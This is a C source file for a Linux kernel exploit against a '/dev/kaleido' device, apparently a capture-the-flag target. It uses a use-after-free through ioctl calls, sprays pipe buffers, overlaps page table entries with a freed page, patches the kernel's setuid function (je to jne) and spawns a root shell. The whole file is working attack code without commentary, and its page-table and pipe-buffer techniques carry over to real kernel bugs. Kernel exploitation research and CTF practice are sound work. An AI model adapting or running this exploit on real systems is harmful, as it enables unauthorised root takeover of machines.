#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

#include "page.h"
#include "ret2usr.h"
#include "util.h"
#include "vars.h"

static int32_t kaleido_alloc(char *buf);
static int32_t kaleido_free(uint64_t idx);
static int32_t kaleido_read(uint64_t idx, char *buf);
static int32_t kaleido_write(uint64_t idx, char *buf);

#define NUM_PIPE_SPRAY (0x30)
#define NUM_PTE_SPRAY (0x10)

struct request {
    uint64_t idx;
    char *buf;
};
int32_t fd;

int main(void) {
    puts("[ ] exploit start");

    bool *parent_exploited =
        mmap(NULL, sizeof(bool), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (parent_exploited == MAP_FAILED) {
        fatal("mmap");
    }
    *parent_exploited = false;

    if (CHECK(fork()) == 0) {
        while (!*parent_exploited) {
            usleep(10 * 1000);
        }
        setuid(0);
        spawn_shell();
        exit(0);
    }

    puts("[ ] pre-allocating pipes");
    int32_t pipefd[NUM_PIPE_SPRAY][2];
    for (uint32_t i = 0; i < NUM_PIPE_SPRAY; i++) {
        CHECK(pipe(pipefd[i]));
        CHECK(write(pipefd[i][1], &i, 4));
        CHECK(write(pipefd[i][1], "dead", 4));
    }

    puts("[ ] pre-allocating PGD, PUD, and PMD");
    void *ptr[NUM_PTE_SPRAY];
    for (uint32_t i = 0; i < NUM_PTE_SPRAY; i++) {
        ptr[i] =
            mmap((void *)pt_index_to_vaddr(1, 2, i, 0, 0), 0x200 * PAGE_SIZE,
                 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE, -1, 0);
        if (ptr[i] == MAP_FAILED) {
            fatal("mmap");
        }
    }
    *(char *)ptr[0] = 0;

    fd = CHECK(open("/dev/kaleido", O_RDWR));

    puts("[ ] spraying struct pipe_buffer at kmalloc-2k");
    for (uint32_t i = 0; i < NUM_PIPE_SPRAY / 2; i++) {
        CHECK(fcntl(pipefd[i][1], F_SETPIPE_SZ, 0x1000 * 32));  // 0x28 * 32 = 0x500
    }

    puts("[+] UAF ready");
    kaleido_alloc((void *)0xdeadbeef);

    puts("[+] overlapping struct pipe_buffer to the victim object");
    for (uint32_t i = NUM_PIPE_SPRAY / 2; i < NUM_PIPE_SPRAY; i++) {
        CHECK(fcntl(pipefd[i][1], F_SETPIPE_SZ, 0x1000 * 32));
    }

    puts("[+] overwriting pipe->bufs[0].page LSB");
    char buf[0x500];
    CHECK(kaleido_read(0, buf));
    buf[0] = '\0';
    CHECK(kaleido_write(0, buf));

    puts("[ ] finding the victim pipe_buffer");
    int32_t victim[2] = {0};
    int32_t origin[2] = {0};
    for (uint32_t i = 0; i < NUM_PIPE_SPRAY; i++) {
        uint32_t idx;
        CHECK(read(pipefd[i][0], &idx, 4));
        if (idx != i) {
            victim[0] = pipefd[idx][0];
            victim[1] = pipefd[idx][1];
            origin[0] = pipefd[i][0];
            origin[1] = pipefd[i][1];
            goto found_victim;
        }
    }
    puts("[-] unable to find victim pipe_buffer");
    return 0;

found_victim:
    puts("[+] found the victim pipe_buffer");
    puts("[ ] freeing the pipe_buffer by closing the original pipefd");
    CHECK(close(origin[0]));
    CHECK(close(origin[1]));

    puts("[+] overlapping PTE to the freed page");
    for (uint32_t i = 1; i < NUM_PTE_SPRAY; i++) {
        *(char *)ptr[i] = 0;
    }

    uint64_t pte[0x1ff];
    const uint64_t offset_setuid = 0x6dce0;
    for (uint32_t i = 0; i < 0x1ff; i++) {
        const uint64_t phys_base = CONFIG_PHYSICAL_START + i * CONFIG_PHYSICAL_ALIGN;
        const uint64_t page_setuid = align_to_page(phys_base + offset_setuid);
        pte[i] = phys_page_to_pte(page_setuid);
    }

    puts("[+] overwriting PTE");
    CHECK(write(victim[1], pte, 0x1ff * 0x8));

    puts("[ ] finding setuid");
    char *addr;
    for (uint32_t i = 1; i < NUM_PTE_SPRAY; i++) {
        for (uint32_t j = 1; j < 0x200; j++) {
            const uint64_t addr_page_setuid = (uint64_t)ptr[i] + pte_index_to_vpart(j);
            const uint64_t addr_setuid = addr_page_setuid + vaddr_to_page_offset(offset_setuid);
            if (*(uint64_t *)addr_setuid == 0x55415641e5894855) {
                addr = (void *)addr_setuid;
                goto found_setuid;
            }
        }
    }
    puts("[-] unable to find setuid");
    return 0;

found_setuid:
    puts("[+] found setuid");
    puts("[+] switching branch condition");
    addr[72] = 0x75;  // je -> jne
    *parent_exploited = true;
    pause();

    puts("[-] exploit failed...");
    return 0;
}

#define CMD_ALLOC 0x13370000u
#define CMD_FREE 0x13370001u
#define CMD_READ 0x13370002u
#define CMD_WRITE 0x13370003u

static int32_t kaleido_alloc(char *buf) {
    struct request req = {.idx = 0, .buf = buf};
    return ioctl(fd, CMD_ALLOC, &req);
}

static int32_t kaleido_free(uint64_t idx) {
    struct request req = {.idx = idx, .buf = NULL};
    return ioctl(fd, CMD_FREE, &req);
}

static int32_t kaleido_read(uint64_t idx, char *buf) {
    struct request req = {.idx = idx, .buf = buf};
    return ioctl(fd, CMD_READ, &req);
}
static int32_t kaleido_write(uint64_t idx, char *buf) {
    struct request req = {.idx = idx, .buf = buf};
    return ioctl(fd, CMD_WRITE, &req);
}
